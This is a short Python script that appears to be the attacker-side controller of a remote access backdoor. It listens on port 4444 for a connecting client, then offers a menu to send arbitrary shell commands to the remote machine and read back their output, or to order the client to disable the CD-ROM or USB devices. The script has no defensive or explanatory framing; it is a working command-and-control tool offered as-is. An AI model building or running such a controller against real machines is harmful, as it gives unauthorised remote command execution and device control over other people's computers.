from socket import *

s = socket(2, 1)
s.bind(("192.168.6.4", 4444))
s.listen(1)
print("Connected To Port")
print("______________________________\n")

client, addr = s.accept()
print("Connected To" + str(addr) + "\n")
print("______________________________")

data = input('''
    1-CMD
    5-Disable CDROM   
    6-Disable USB


Enter your choice:''')

if data == "1":
    client.send((data).encode())
    while True:
        Command = input("Enter Your Command: ")
        if Command.upper() == "F":
            break
        client.send((Command).encode())
        new_data = client.recv(102456).decode()
        print(new_data)


elif data == "5":
    F = open("Disable_CDROM Result.txt", "w")
    client.send((data).encode())
    new_data = client.recv(1024).decode()
    F.write(new_data)
    F.close()

elif data == "6":
    F = open("Disable_USB Result.txt", "w")
    client.send((data).encode())
    new_data = client.recv(1024).decode()
    F.write(new_data)
    F.close()

